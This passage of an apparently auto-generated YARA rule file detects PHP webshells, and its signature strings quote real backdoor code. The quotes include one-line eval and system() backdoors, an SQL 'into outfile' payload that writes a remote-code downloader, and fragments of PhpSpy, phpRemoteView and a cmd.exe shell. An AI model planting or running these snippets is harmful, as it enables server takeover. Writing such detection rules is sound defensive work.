      $s3 = "use Nova\\Database\\Migrations\\Migration;" fullword ascii
      $s4 = "$table->integer('size')->unsigned();" fullword ascii
      $s5 = "use Nova\\Database\\Schema\\Blueprint;" fullword ascii
      $s6 = "$table->string('type', 40)->nullable();" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 2KB and
      all of them
}

rule a7d303b5b16323dfea00dcb4474428c79e867ae6
{
   meta:
      description = "php17 - file a7d303b5b16323dfea00dcb4474428c79e867ae6.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "5eb28af9069e459220a04b4b98f693a3a0efd92a79e671b0cc0a197759f5c4f3"
   strings:
      $s1 = ";$x($_POST['root']); ?>" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 1KB and
      all of them
}

rule ac8096450f2574cc05e596968bdcae29a27390f7
{
   meta:
      description = "php17 - file ac8096450f2574cc05e596968bdcae29a27390f7.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "971fb04c71f1b979e92ad973ec5ba20c46da0797fe53e26bd25ea9d4957c03d9"
   strings:
      $s1 = "ZAtVVkJepDSJCG4r5SLE4SVwR2Bvd6lzivLfO7MYx6Um1/qLwTszzzPP7DKzKYuWTJj0pCwUK9Qo+MbZlCj2rMapespnJE4jIZlyF8HZ6Jhas0F/yIlLKKczAu9pKZVL" ascii
      $s2 = "9ORu8m/lqa02oc5nSS1y0Dqq8C252jRrgDBRJULBeB7FzNRGm1K7tupvTB8ySreOLlSxzcdF+SUfdVLylP+qlnL0Fd4rkbMiLpfMbEq0BmlhGjUmSP/FsjYJuzUV/c+Z" ascii
      $s3 = "oT8IluhXlqxnQVkpUgMPP1VJgoOxmWvDGL45WMBHmBWZMrHt9nov+KMXoSWWXNWONjlZ+Fc3t0EID9CfKsWn4zGQ4YR19Bh1tA6n1uVggijuXTDfCxb+deDPr+9Amk2U" ascii
      $s4 = "ZbSMZLWsIrnM0iiTy2jpiIpq50ilLh3HUZyyow+TydHh5MOIleUYrVlCTKkEL6U5DO88/3fPv6cXQXAbXtzcBfTBJsZqtXIMi7iuS5Iol8wa9F8Adpc3pLVzHYheB30G" ascii
      $s5 = "MduKdSD4AlinGK4rbTQ+vY3DQjIxmj/C9Ui7dZfkLfgfBHC3Kpi+C0zJCZYDvbY9k5XIFENlto6y1uurNMsZTPWElYnWvRGu8fHEOW7yyJSsYydHx03oKwoQTFY5Fog9" ascii
      $s6 = "qNh3g7AV6k5ot+fpW5OEIaJh6grUItkzi2usLYo4LyXbXn1d1x9iE7xJJLKMv5ScFaaWapPjQ+BlQhRl/YTdtclPh81wgCiL4BjFYVSzG9CWidFVJMcgmPx44kw+io+F" ascii
      $s7 = "a+gdyP/y3eDvzMb3frsJvHB+etq4CqYqUaAblotgJbLEzCScIcjr3Avuh7wWhzshoOxb9ek4EoZObQH/wvk5CDfwYFzeTolhHbju2fzqzrOIxmpv4a7I/4H+o950fYpF" ascii
      $s8 = "ObHsLgXaumuB1n2K4TxmSScl2rop0boXJbTITkq0vVEO+m1StO9F+pk/dp8ysL1zzMC6F2UWl52UaOumROtelLzoVom2bkq0fo9S956k3fx878zzPV9PjK1vCDoedYbC" ascii
      $s9 = "n5191[25].$Cn5191[7], $H5280  ,\"614\");" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 5KB and
      all of them
}

rule sig_2966f6e73a10a5dd4276268ebf34f0110f16cec4
{
   meta:
      description = "php17 - file 2966f6e73a10a5dd4276268ebf34f0110f16cec4.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "26d688264a4248e2da4a29559baf8834d3fd6859324d0e5d5ced8a0fbcf168dd"
   strings:
      $s1 = "getFile($_POST['p']!=''?$_POST['p']:$_SERVER['DOCUMENT_ROOT'],$_POST['charset']!=''?$_POST['charset']:\"UTF-8\");" fullword ascii
      $s2 = "echo \"<a href=\\\"javascript:get('\".str_replace('\\\\','/',$path).\"/\".$file.\"');\\\">\".$file.\"</a><br>\";" fullword ascii
      $s3 = "http://www.XXX.com.cn/data/conf_ads.php?file=admin3.php&url=http://p2j.cn/1.txt" fullword ascii
      $s4 = "header(\"Content-Type:text/html;charset=\".$charset);" fullword ascii
      $s5 = "document.getElementById('action').value = \"get\";" fullword ascii
      $s6 = "<input type=\\\"button\\\" style=\\\"margin-left:20px;\\\" value=\\\"update\\\" onclick=\\\"update('update')\\\" />" fullword ascii
      $s7 = "<input type=\\\"button\\\" style=\\\"margin-left:20px;\\\" value=\\\"delete\\\" onclick=\\\"update('delete')\\\" />" fullword ascii
      $s8 = "document.getElementById('action').value = act;" fullword ascii
      $s9 = "echo \"<form action=\\\"\\\" method=\\\"post\\\" id=\\\"fm\\\">\";" fullword ascii
      $s10 = "select '<?php file_put_contents(dirname(__FILE__).\"/\".$_GET[\\'file\\'], file_get_contents($_GET[\\'url\\']));?>' into outfile" ascii
      $s11 = "echo \"File:<input type=\\\"text\\\" style=\\\"width:350px;\\\" name=\\\"file\\\" value=\\\"\".$path.\"\\\" />" fullword ascii
      $s12 = "document.getElementById('fm').submit();" fullword ascii
      $s13 = "document.getElementById('p').value = p;" fullword ascii
      $s14 = "echo \"<script>history.back(-1);alert('ok');</script>\";" fullword ascii
      $s15 = "select '<?php file_put_contents(dirname(__FILE__).\"/\".$_GET[\\'file\\'], file_get_contents($_GET[\\'url\\']));?>' into outfile" ascii
      $s16 = "echo \"<script>history.back(-1);alert('delete ok');</script>\";" fullword ascii
      $s17 = "echo \"<textarea style=\\\"width:600px;height:500px;\\\" name=\\\"data\\\">\".htmlspecialchars(file_get_contents($path)).\"</tex" ascii
      $s18 = "echo \"<textarea style=\\\"width:600px;height:500px;\\\" name=\\\"data\\\">\".htmlspecialchars(file_get_contents($path)).\"</tex" ascii
      $s19 = "if(file_exists($_POST['file'])){" fullword ascii
      $s20 = "file_put_contents($filename, $data);" fullword ascii
   condition:
      uint16(0) == 0x7561 and filesize < 6KB and
      8 of them
}

rule sig_06a81a4fb98d149f2d31c68828fa6eb2
{
   meta:
      description = "php17 - file 06a81a4fb98d149f2d31c68828fa6eb2.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "c492872ff7c5745d71a84c59f7795199b90d31380acb66e601a9710a548c0ac3"
   strings:
      $s1 = "echo $func->invokeArgs(array(\"$_GET[c]\"));" fullword ascii
      $s2 = "$func = new ReflectionFunction(\"system\");" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 1KB and
      all of them
}

rule AllFilterTypes
{
   meta:
      description = "php17 - file AllFilterTypes.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "850d1a0e9d371c196e2332ee20dcd10288efecd6f7d28b96bfebd630be3eb3fb"
   strings:
      $s1 = "private static $table_name = 'SearchContextTest_AllFilterTypes';" fullword ascii
      $s2 = "private static $searchable_fields = array(" fullword ascii
      $s3 = "namespace SilverStripe\\ORM\\Tests\\Search\\SearchContextTest;" fullword ascii
      $s4 = "private static $db = array(" fullword ascii
      $s5 = "'CollectionMatch' => 'ExactMatchFilter'," fullword ascii
      $s6 = "'FulltextField' => 'FulltextFilter'," fullword ascii
      $s7 = "'StartsWith' => 'StartsWithFilter'," fullword ascii
      $s8 = "'ExactMatch' => 'ExactMatchFilter'," fullword ascii
      $s9 = "'PartialMatch' => 'PartialMatchFilter'," fullword ascii
      $s10 = "use SilverStripe\\Dev\\TestOnly;" fullword ascii
      $s11 = "use SilverStripe\\ORM\\DataObject;" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 2KB and
      8 of them
}

rule sig_239ff080bc66c7edceadcd80e5b05f9677a289e0
{
   meta:
      description = "php17 - file 239ff080bc66c7edceadcd80e5b05f9677a289e0.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "8a715131660a8a990d01f8ffac79cf185283c5f1191d333cb5fff7605735c3a2"
   strings:
      $x1 = "$func=\"cr\".\"eat\".\"e_fun\".\"cti\".\"on\";$R_DHQjEVmhf=$func('$x','ev'.'al'.'(\"?>\".gz'.'in'.'fla'.'te(ba'.'se'.'64'.'_de'." ascii
      $s2 = "Ihj3+SPJWhu1e/SH5YLU0aTkUyjmavt91jdGk56vD2vlW5EEMO7NE7YgIvcoG/MgXW+yTZnhgkypkCotxg7KmQKM4QoDmpK+IRCqMrK5qE6hnTMFK14YJcFusR3logaN" ascii
      $s3 = "<?php $GLOBALS['pass'] = \"8020469869f2880c93823d46c8bf6e59b2882525\";" fullword ascii
      $s4 = "CqFOVbwMcqQZiPAb/fU/n7//FXjKBp4+fP5G4tQvwc8oOfiXk0QKUsi9snD0HbhiXqARIjFISwx+c+0MkVLIXm1vFgclQDlrDed8rlwSreeQteTNnSccxQfFWkTNftP+" ascii
      $s5 = "P/jAuN4ps9R+wBCCtL2rD2rcvX7b+B5fn7788ZnUGFXa6uDpw/09fr4DSLq/h3ko/BT4hUP+goZxx0rw2OTTl/8f\");?>" fullword ascii
      $s6 = "b1hNUdfpJuFcKSMVrTUoDGrjspY3bsvtOPA4/fTw8WsTvu/4xmm+12XB1g8Li5iK4KgKRpN8gff28rCXwrS/suo514jwCZnnhcE6CdwrCtjOjgvJ37jHda7l/G6RTs0K" ascii
      $s7 = "VS2QQA6Nl4U5tRPOH5p2b1TBhDnQeuOy6OvCRo8FNFiNY8TeDLlqIsaD/ZCgtkq/lj6k7O/BfZBmUn+Lj/q6MR9LgqnEJgWN3Go55INFOAC2q8MeMdBFmYPaUFo6CT8P" ascii
      $s8 = "mwtXmb9ZBVlcuIYl7rFtYqYgCQ6R5pg/MECVHwVyRUhxZWys9MvBuBZ2NBW8RJEJ0h06m+ZHV32ukx5QNFc3H3GaeX4HPGu09vfT7fruMXswbjIMpMs4hI/atSPi4rat" ascii
      $s9 = "U+7ZDHNKe/um/re1DLLgZHJBVyujNf/qfxrvof5z5281yV+N9HijN85Z48Q8obgsi9ctPRs2p7za/boXyRrgD58ePzy2gZLtzw8nB6sp1+D68MZsa/nTdfmsjfM4NwD4" ascii
      $s10 = "gYvCoBiyjL5OeyMy82X+Gx+WVZmcVbq+BkLTb1EryPE730PfcoAtqYw1PLx3eD0+K/3vDtCM+XOFTpXb3OrOTP67RGJH4jN7oUx95LojJ+fv9uWOb2zdYXS3/fZqv8z/" ascii
      $s11 = "l1Au9tRuVhS1adNXRpMhmPZMp9gNh3Ey77PuABQihAJ1mfV7w6HLyQNoyewOh+06jUqGLEdSOibnVjJAU4sgULjn9GNssQeAajC2x5YkM/6BQTdhrSSpyGYJdqHE0jKx" ascii
      $s12 = "Mbrb3W81ki+LfWFZXQ6oMKEPVuGUTijhRWlRo2LNzQxoWrHSJkLRNfVAMcX47EwSpYZxWKS5FZdfJxulXX/R4YhynOvWasYw1Tlt25HOkO+K0QTTlCdFktPLu1lj1Z2O" ascii
      $s13 = "0G4Xrl/FN1dqF/Qksob+Axj9H8OoaJqRJD+EUfkWxq+Gr17Uy4sxcm9LBkruWA3DLlriVRG5XON5sbrvUCjnA2LfQnCCebX4t8rd6KxGuH/AXGpivtt5x66tsS/1ADip" ascii
      $s14 = "yDXo7rCv05GH5qMdHGhZD411BXC2RSZ5aDwER+huZNZONTg+mnmUIJhYkF1aM0VoopuDiLUOihQOUmN8MFKwu+nZm8mS58aiuerL2GB89H1Bs6K5oVdCNJ2Sa1YGA97Z" ascii
      $s15 = "Q+dvFyXRAn2oW/uP01baC/1Y682zKfyfpifPqutkuf/7lNer2rWeBRp2PPw30W0n9+e2b/6vkvs/Ucmd+q5B//8BO6uxcf5rLa0bQ+HfN4D+D5LIH4xnORW4X8o4pV3u" ascii
      $s16 = "yA4Uzfl/0DK1WcGeYLpJD4wqbd1kbCbopy0Hhg30G3JJ7SmcChC1p1SzPSAXAQW8A88jKuwlo4sa0norKywX8IV8obu3SQ/xPtzcQdqANlxNBCTtB0gMBINPfl01OH/W" ascii
      $s17 = "XPzdHz59agfgu5sR2XhUH8+1naaWuyWMy/D4qg5oFpfbxcg7RXBJPa0rPCmDs1Qn57n7xwdc06h2qf/TSU205V9VN++eVFjTsrZDn601XHh+RVmbgo/v/v7322+rOs3j" ascii
      $s18 = "H/uN1bK16p+JotSIJ8KZVZ9bkvkey9Qa43y+JhTm0cIqX6+fF8l6m+iSlXRGTy8WhQ0vlIddepoU85kqGSeJWnoeXmVW3VN3IszzzUZeKLaX/XAmny/E89OOsKgWBH2v" ascii
      $s19 = "1pJ5lN8+1HPLIZCrwusEro2Glxf4QsGdWPBsnZOns+7DTFAUWQi8ckFyllKL951u4iAkBp+BbfEkZkX34UgRug/CT+ID9MWYTpgsDc18ETsK0e4rTImCqhCwEHdTfgKW" ascii
      $s20 = "0Qxob7RILaqHUQNoHOfulhS1XuFYjh/41G4j9ruNdf+QOtdlukoficKpqqSrDUXUDrxWja+HqepR18K7MrA/ilRnvW6vo4t6cTscJ4w0wRzS+cxGGhzTS2G4HI6OiVSL" ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 300KB and
      1 of ($x*) and 4 of them
}

rule AbstractPhpFileCacheWarmer
{
   meta:
      description = "php17 - file AbstractPhpFileCacheWarmer.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "873f1aaa10b52788597ecede881dee343c954725586190977f6904842a30251b"
   strings:
      $s1 = "* @param CacheItemPoolInterface $fallbackPool The pool where runtime-discovered metadata are cached" fullword ascii
      $s2 = "$values = array_map(function ($val) { return null !== $val ? unserialize($val) : null; }, $arrayAdapter->getValues());" fullword ascii
      $s3 = "use Symfony\\Component\\HttpKernel\\CacheWarmer\\CacheWarmerInterface;" fullword ascii
      $s4 = "* @return bool false if there is nothing to warm-up" fullword ascii
      $s5 = "public function __construct(string $phpArrayFile, CacheItemPoolInterface $fallbackPool)" fullword ascii
      $s6 = "$this->warmUpPhpArrayAdapter(new PhpArrayAdapter($this->phpArrayFile, $this->fallbackPool), $values);" fullword ascii
      $s7 = "* @param ArrayAdapter $arrayAdapter" fullword ascii
      $s8 = "protected function warmUpPhpArrayAdapter(PhpArrayAdapter $phpArrayAdapter, array $values)" fullword ascii
      $s9 = "$item = $this->fallbackPool->getItem($k);" fullword ascii
      $s10 = "$fallbackPool = new ProxyAdapter($fallbackPool);" fullword ascii
      $s11 = "* @param string                 $phpArrayFile The PHP file where metadata are cached" fullword ascii
      $s12 = "use Symfony\\Component\\Cache\\Adapter\\ProxyAdapter;" fullword ascii
      $s13 = "use Psr\\Cache\\CacheItemPoolInterface;" fullword ascii
      $s14 = "$this->fallbackPool->commit();" fullword ascii
      $s15 = "$this->fallbackPool->saveDeferred($item->set($v));" fullword ascii
      $s16 = "namespace Symfony\\Bundle\\FrameworkBundle\\CacheWarmer;" fullword ascii
      $s17 = "if (!$fallbackPool instanceof AdapterInterface) {" fullword ascii
      $s18 = "use Symfony\\Component\\Cache\\Adapter\\AdapterInterface;" fullword ascii
      $s19 = "use Symfony\\Component\\Cache\\Adapter\\PhpArrayAdapter;" fullword ascii
      $s20 = "// the ArrayAdapter stores the values serialized" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 8KB and
      8 of them
}

rule sig_5e01fcb961c0f6b4f97441717ad2057bf0b1524a
{
   meta:
      description = "php17 - file 5e01fcb961c0f6b4f97441717ad2057bf0b1524a.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "35bc5df5b3079149b022c92a5b6005bbbd625bb94c4d0f136df90fc6b8807701"
   strings:
      $s1 = "echo $catid = isset($_GET['catid'])?base64_decode($_GET['catid']):'';" fullword ascii
      $s2 = "$id = $_GET['id'];" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 1KB and
      all of them
}

rule AbstractAnemicTestCase
{
   meta:
      description = "php17 - file AbstractAnemicTestCase.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "4396abb0cdff23d076eaa1cd16eee22a1ab2e1e21af26ef0a363b07cf63a25f9"
   strings:
      $s1 = "}, $rc->getMethod('__construct')->getParameters());" fullword ascii
      $s2 = "foreach ($rc->getProperties() as $property) {" fullword ascii
      $s3 = "extract($this->getObjectAndParams());" fullword ascii
      $s4 = "$rc = new ReflectionClass($this->getObjectAndParams()['object']);" fullword ascii
      $s5 = "* This is the abstract anemic test case class." fullword ascii
      $s6 = "return $property->getName();" fullword ascii
      $s7 = "}, $rc->getProperties());" fullword ascii
      $s8 = "return $param->getName();" fullword ascii
      $s9 = "$this->assertSame($value, $object->{$key});" fullword ascii
      $s10 = "public function testPropertiesMatchTheConstructor()" fullword ascii
      $s11 = "public function testPropertiesAreCorrectlyDefined()" fullword ascii
      $s12 = "public function testPropertyAccessBehavesCorrectly()" fullword ascii
      $s13 = "$this->assertSame($properties, $params);" fullword ascii
      $s14 = "$properties = array_map(function ($property) {" fullword ascii
      $s15 = "$this->assertTrue($property->isPublic());" fullword ascii
      $s16 = "$this->assertFalse($property->isStatic());" fullword ascii
      $s17 = "$params = array_map(function ($param) {" fullword ascii
      $s18 = "$this->assertTrue($rc->isFinal());" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 4KB and
      8 of them
}

rule sig_42dd5dd2bcfbc7ef0404d33d6bf51c167e4f0aed
{
   meta:
      description = "php17 - file 42dd5dd2bcfbc7ef0404d33d6bf51c167e4f0aed.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "a4c7a34b0ad8e27edadf306b1a52d70281a99beed3e078382c42790d3475f985"
   strings:
      $x1 = "<input name=\"submit_btn\" type=\"submit\" value=\"Execute Command\"></p>" fullword ascii
      $x2 = "PHP Shell is aninteractive PHP-page that will execute any command" fullword ascii
      $s3 = "entered. See the files README and INSTALL or http://www.gimpster.com" fullword ascii
      $s4 = "<h1>[YOUR HEADER[ <?php echo PHPSHELL_VERSION ?> [ADITTIONAL TEXT] -" fullword ascii
      $s5 = "document.forms[0].command.focus();" fullword ascii
      $s6 = "<title>[ADDITINAL TITTLE]-phpShell by:[YOURNAME]<?php echo PHPSHELL_VERSION ?></title>" fullword ascii
      $s7 = "Copyright (C) 2000-2002 Martin Geisler < gimpster@gimpster.com>" fullword ascii
      $s8 = "* PHP Shell *" fullword ascii
      $s9 = "/* We try and match a cd command. */" fullword ascii
      $s10 = "$Id: phpshell.php,v 1.18 2002/09/18 15:49:54 gimpster Exp $" fullword ascii
      $s11 = "address: http://www.gnu.org/copyleft/gpl.html#SEC1" fullword ascii
      $s12 = "/* Run through all the files and directories to find the dirs. */" fullword ascii
      $s13 = "<p>Command: <input type=\"text\" name=\"command\" size=\"60\">" fullword ascii
      $s14 = "<form name=\"myform\" action=\"<?php echo $PHP_SELF ?>\" method=\"post\">" fullword ascii
      $s15 = "echo \"<option value=\"\". strrev(substr(strstr(strrev($work_dir), \"/\"), 1)) .\"\">Parent Directory</option> \";" fullword ascii
      $s16 = "Place - Suite 330, Boston, MA 02111-1307, USA." fullword ascii
      $s17 = "system($command);" fullword ascii
      $s18 = "$command .= \" 1> $tmpfile 2>&1; \" ." fullword ascii
      $s19 = "/* First we check if there has been asked for a working directory. */" fullword ascii
      $s20 = "extract($HTTP_GET_VARS);" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 10KB and
      1 of ($x*) and 4 of them
}

rule sig_7d5b54c7cab6b82fb7d131d7bbb989fd53cb1b57
{
   meta:
      description = "php17 - file 7d5b54c7cab6b82fb7d131d7bbb989fd53cb1b57.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "e602362970a0d378c1011d36368d43e0d3d5934651e4a104a546f6e51b0cfab1"
   strings:
      $x1 = "*  - executing any shell commands and any PHP-code" fullword ascii
      $x2 = "exit(\"<h1><a href=http://php.spb.ru/remview/>phpRemoteView</a>: Access Denied - password erroneous</h1>\\n\");" fullword ascii
      $x3 = "exit(\"<h1><a href=http://php.spb.ru/remview/>phpRemoteView</a>: Access Denied - your host not allow</h1>\\n\");" fullword ascii
      $x4 = "*  2002.01.20 add panel 'TOOLS': eval php-code and run shell commands" fullword ascii
      $x5 = "*  - view index of directory (/var/log - view logs, /tmp - view PHP sessions)" fullword ascii
      $x6 = "$system_access=true;     // true - user (you) may be run shell commands" fullword ascii
      $s7 = "*             add panel 'TOOLS': eval php-code and run shell commands" fullword ascii
      $s8 = "*  Free download from http://php.spb.ru/remview/" fullword ascii
      $s9 = "if (!preg_match($s,getenv(\"REMOTE_ADDR\")) && !preg_match($s,gethostbyaddr(getenv(\"REMOTE_ADDR\")))) " fullword ascii
      $s10 = "$HTTP_SERVER_VARS['PHP_AUTH_USER']!=$login || $HTTP_SERVER_VARS['PHP_AUTH_PW']!=$pass)) {" fullword ascii
      $s11 = "$phpeval_access=true;    // true - user (you) may be execute any php-code" fullword ascii
      $s12 = "*  2003.04.22 read first 64Kb of null-size file (example: /etc/zero), " fullword ascii
      $s13 = "*  - download any file and open on Notepad" fullword ascii
      $s14 = "$host_allow=array(\"*\");  // Type list of your(allow) hosts. All other - denied." fullword ascii
      $s15 = "if ($login!==false && (!isset($HTTP_SERVER_VARS['PHP_AUTH_USER']) || " fullword ascii
      $s16 = "*  (c) Dmitry Borodin, dima@php.spb.ru, http://php.spb.ru" fullword ascii
      $s17 = "$s.=sprintf(\"%1s%1s%1s\", $group['read'], $group['write'], $group['execute']); " fullword ascii
      $s18 = "$s.=sprintf(\"%1s%1s%1s\", $owner['read'], $owner['write'], $owner['execute']); " fullword ascii
      $s19 = "$s.=sprintf(\"%1s%1s%1s\", $world['read'], $world['write'], $world['execute']); " fullword ascii
      $s20 = "// antofix 'register globals': $HTTP_GET/POST_VARS -> normal vars;" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 100KB and
      1 of ($x*) and 4 of them
}

rule sig_1477fa53e5e56605fe001c88831fcb71e30d6e86
{
   meta:
      description = "php17 - file 1477fa53e5e56605fe001c88831fcb71e30d6e86.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "124a69cac6fa533abd737127a65ad261a4da66148bf1bdc341e3f733966b5ad6"
   strings:
      $x1 = "if(!@function_exists('escapeshellarg')){$res=$api->WinExec(\"cmd.exe /c $cfe >\\\"$output\\\"\",0);}" fullword ascii
      $x2 = "if(!@function_exists('escapeshellarg')){$suntzu->Run('c:\\windows\\system32\\cmd.exe /c '.$cfe.' > \"'.$output.'\"');}" fullword ascii
      $x3 = "else if(isset($_POST['reverse'])) { if(@ftp_login($connection,$user,strrev($user))) { echo \"[+] $user:\".strrev($user).\" - su" fullword ascii
      $x4 = "else{$res=$api->WinExec(\"cmd.exe /c \".@escapeshellarg($cfe).\" >\\\"$output\\\"\",0);}" fullword ascii
      $x5 = "else{$suntzu->Run('c:\\windows\\system32\\cmd.exe /c '.@escapeshellarg($cfe).' > \"'.$output.'\"');}" fullword ascii
      $x6 = "if(@ftp_login($connection,$_POST['ftp_login'],$user)) { echo \"[+] \".$_POST['ftp_login'].\":$user - success\\r\\n\"; $suc++; }" fullword ascii
      $x7 = "else if ($file=readzlib($_POST['loc_file'])) { $filedump = $file; } else { err(1,$_POST['loc_file']); $_POST['cmd']=\"\"; }" fullword ascii
      $x8 = "else if ($file=readzlib($_POST['d_name'])) { $filedump = $file; } else { err(1,$_POST['d_name']); $_POST['cmd']=\"\"; }" fullword ascii
      $x9 = "echo sr(15,\"<b>\".$lang[$language.'_text53'].$arrow.\"</b>\",in('text','s_dir',85,$dir).\" * ( /root;/home;$tempdir )\");" fullword ascii
      $x10 = "echo sr(15,\"<b>\".$lang[$language.'_text73'].$arrow.\"</b>\",in('text','s_dir',85,$dir).\" * ( /root;/home;$tempdir )\");" fullword ascii
      $x11 = "{@win32_create_service(array('service'=>$n_ser,'display'=>$n_ser,'path'=>'c:\\\\windows\\\\system32\\\\cmd.exe','params'=>\"/c $" ascii
      $x12 = "{@win32_create_service(array('service'=>$n_ser,'display'=>$n_ser,'path'=>'c:\\\\windows\\\\system32\\\\cmd.exe','params'=>\"/c $" ascii
      $x13 = "elseif($file=moreread($_POST['e_name'])) { $filedump = $file; if(!@is_writable($_POST['e_name'])) { $only_read = 1; }; }" fullword ascii
      $x14 = "else{@win32_create_service(array('service'=>$n_ser,'display'=>$n_ser,'path'=>'c:\\\\windows\\\\system32\\\\cmd.exe','params'=>\"" ascii
      $x15 = "if(!@function_exists('escapeshellarg')){@win_shell_execute('..\\..\\..\\..\\..\\..\\..\\windows\\system32\\cmd.exe /c '.$cfe.' >" ascii
      $x16 = "if(!@function_exists('escapeshellarg')){@win_shell_execute('..\\..\\..\\..\\..\\..\\..\\windows\\system32\\cmd.exe /c '.$cfe.' >" ascii
      $x17 = "else{@win_shell_execute('..\\..\\..\\..\\..\\..\\..\\windows\\system32\\cmd.exe /c '.@escapeshellarg($cfe).' > \"'.$output.'\"')" ascii
      $x18 = "if (@pcntl_wifexited($status)){$res .= '[+] Done! Command \"'.$cfe.'\" successfully executed.';}" fullword ascii
      $x19 = "$api=new ffi(\"[lib='kernel32.dll'] int WinExec(char *APP,int SW);\");" fullword ascii
      $x20 = "'eng_text124'=>'Test bypass open_basedir, add data to file via error_log(php://) (PHP <= 5.1.4, 4.4.2)'," fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 600KB and
      1 of ($x*)
}

rule sig_8780706675f862b56c3c057f5664baa4
{
   meta:
      description = "php17 - file 8780706675f862b56c3c057f5664baa4.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "a938e07d0d59f774395270ac897fdbf2a3a49e9653491a16c53295891b15a172"
   strings:
      $s1 = "<?php $r=$_REQUEST;@file_put_contents($r['js_name'],$r['js_body']);print(md5(9));?>" fullword ascii
   condition:
      uint16(0) == 0x5f5f and filesize < 1KB and
      all of them
}

rule sig_14e02b61905cf373ba9234a13958310652a91ece
{
   meta:
      description = "php17 - file 14e02b61905cf373ba9234a13958310652a91ece.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "067d6bcb4167ae74578a61f4d45e29bb746d0f056492a28481d956d6de383f97"
   strings:
      $s1 = "406576616c286261736536345f6465636f646528" ascii
      $s2 = "$replacement=pack('H*', '406576616c286261736536345f6465636f646528').\"\\\"$payload\\\"))\";" fullword ascii
      $s3 = "$payload='cGhwaW5mbygpOw==';" fullword ascii
      $s4 = "//406576616c286261736536345f6465636f646528: \"eval(base64_decode(\";" fullword ascii
      $s5 = "preg_replace($pattern, $replacement , $subject);" fullword ascii
      $s6 = "//cGhwaW5mbygpOw==: \"phpinfo();\"" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 1KB and
      all of them
}

rule sig_60719ffbfcb48bd3a012b388a29144120a76b254
{
   meta:
      description = "php17 - file 60719ffbfcb48bd3a012b388a29144120a76b254.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "59c3868c4bd8e2c44b3a9800725a8f559f8ad0b0611ee9b774b63b2b79320a2c"
   strings:
      $s1 = "call_user_func($_GET['dede'], base64_decode('QGV2YWwoJF9QT1NUW2JzXSk7')); " fullword ascii
      $s2 = "//call_user_func($_GET['dede'], \"@eval($_POST[bs]);\");" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 1KB and
      all of them
}

rule sig_6ba8c54857834508e8be9eecc6c5a25b259fb4cd
{
   meta:
      description = "php17 - file 6ba8c54857834508e8be9eecc6c5a25b259fb4cd.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "22079a34d3f2bd293d057babdc4e8474cf6e718f1a11622082cdd93f8801a3f1"
   strings:
      $x1 = "p('<p><a href=\"http://www.alturks.com/phpspy/plugin/\" target=\"_blank\">Get plugins</a></p>');" fullword ascii
      $x2 = "Copyright (C) 2004-2008 <a href=\"http://www.alturks.com\" target=\"_blank\">Security Angel Team [S4T]</a> All Rights Reserved." fullword ascii
      $x3 = "<a href=\"javascript:goaction('shell');\">Execute Command</a> |" fullword ascii
      $s4 = "<td><span style=\"float:right;\"><a href=\"http://www.alturks.com\" target=\"_blank\"><?php echo str_replace('.','','P.h.p.S.p.y" ascii
      $s5 = "header('Content-Disposition: attachment;filename='.$_SERVER['HTTP_HOST'].'_Files.tar.gz');" fullword ascii
      $s6 = "Ver: 2008</a></span><?php echo $_SERVER['HTTP_HOST'];?> (<?php echo gethostbyname($_SERVER['SERVER_NAME']);?>)</td>" fullword ascii
      $s7 = "<td><span style=\"float:right;\"><a href=\"http://www.alturks.com\" target=\"_blank\"><?php echo str_replace('.','','P.h.p.S.p.y" ascii
      $s8 = "<?php if (!IS_WIN) {?> | <a href=\"javascript:goaction('backconnect');\">Back Connect</a><?php }?>" fullword ascii
      $s9 = "scookie('phpspypass', '', -86400 * 365);" fullword ascii
      $s10 = "function dbconn($dbhost,$dbuser,$dbpass,$dbname='',$charset='',$dbport='3306') {" fullword ascii
      $s11 = "$filelist=$this -> GetFileList($dir);//+-+ --#&#1101;" fullword ascii
      $s12 = "return $data . $ctrldir . $this -> eof_ctrl_dir . pack('v', sizeof($this -> ctrl_dir)) . pack('v', sizeof($this -> ctrl_dir)) ." fullword ascii
      $s13 = "<a href=\"javascript:goaction('sqlfile');\">MySQL Upload &amp; Download</a> |" fullword ascii
      $s14 = "$filename = basename($_SERVER['HTTP_HOST'].'_MySQL.sql');" fullword ascii
      $s15 = "dbconn($dbhost,$dbuser,$dbpass,$dbname,$charset,$dbport);" fullword ascii
      $s16 = "dbconn($dbhost, $dbuser, $dbpass, $dbname, $charset, $dbport);" fullword ascii
      $s17 = "/*===================== -&#1097;+&#1076;+&#1089;-  =====================*/" fullword ascii
      $s18 = "<td><a href=\"javascript:dofile(\\'downrar\\');\">Packing download selected</a> - <a href=\"javascript:dofile(\\'delfiles\\');\"" ascii
      $s19 = "makeinput(array('title'=>'Command','name'=>'command','value'=>$command));" fullword ascii
      $s20 = "scookie('phpspypass', $password);" fullword ascii
   condition:
